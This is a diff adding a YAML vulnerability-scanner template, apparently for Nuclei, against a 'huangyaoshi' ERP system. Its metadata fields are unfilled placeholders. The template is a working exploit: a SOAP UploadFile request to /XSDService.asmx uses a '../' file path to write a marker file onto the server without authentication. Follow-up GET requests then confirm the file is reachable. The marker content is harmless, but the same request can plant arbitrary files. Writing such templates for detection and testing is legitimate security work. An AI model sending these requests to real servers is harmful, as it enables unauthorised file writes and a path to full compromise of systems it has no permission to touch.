@@ -1,0 +1,78 @@
+id: huangyaoshi-erp-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical  
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+variables:
+  filename: "{{rand_base(6)}}"  
+http:
+  - raw:
+      - |-
+        POST /XSDService.asmx HTTP/1.1
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        SOAPAction: http://tempuri.org/UploadFile
+        Content-Type: text/xml;charset=UTF-8
+        Host: {{Hostname}}
+        Content-Length: 14047
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
+           <soap:Header/>
+           <soap:Body>
+              <tem:UploadFile>
+                 <!--type: string-->
+                 <tem:filePath>../</tem:filePath>
+                 <!--type: string-->
+                 <tem:fileName>{{filename}}.txt</tem:fileName>
+                 <!--type: base64Binary-->
+                 <tem:buffer>d2hvaXNjZXNoaQ==</tem:buffer>
+                 <!--type: long-->
+                 <tem:Offset>10</tem:Offset>
+              </tem:UploadFile>
+           </soap:Body>
+        </soap:Envelope>
+      - |+
+        GET /Upload2015/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Purpose: prefetch
+        Referer: http://43.139.46.141/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |+
+        GET /Upload2015/gero%20et/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Purpose: prefetch
+        Referer: http://43.139.46.141/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |+
+        GET /{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Purpose: prefetch
+        Referer: http://43.139.46.141/
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'whoisceshi'
